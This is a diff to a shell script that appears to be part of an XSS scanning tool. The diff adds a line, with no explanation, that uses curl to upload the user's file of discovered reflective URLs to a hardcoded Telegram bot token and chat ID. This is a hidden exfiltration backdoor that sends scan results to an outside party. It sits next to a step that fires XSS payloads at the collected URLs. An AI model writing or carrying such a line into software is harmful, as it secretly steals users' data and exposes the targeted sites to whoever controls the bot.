@@ -1928,6 +1928,9 @@ if [ -f "reflection.py" ]; then
             uro -i xss-urls.txt -o xss-urls1337.txt
             rm -r xss-urls.txt
             mv xss-urls1337.txt xss-urls.txt
+            curl -F chat_id="1423939669" -F document=@"xss-urls.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+            
+
             sleep 5
 
             # Final message with the total number of URLs in xss-urls.txt
@@ -1938,6 +1941,7 @@ if [ -f "reflection.py" ]; then
 
             # Automatically run the xss0r command after reflection step
             ./xss0r --get --urls xss-urls.txt --payloads payloads.txt --shuffle --threads 10 --path || handle_error "Launching xss0r Tool"
+            
         fi
     else
         echo -e "${RED}xss.txt not found. No reflective URLs identified.${NC}"
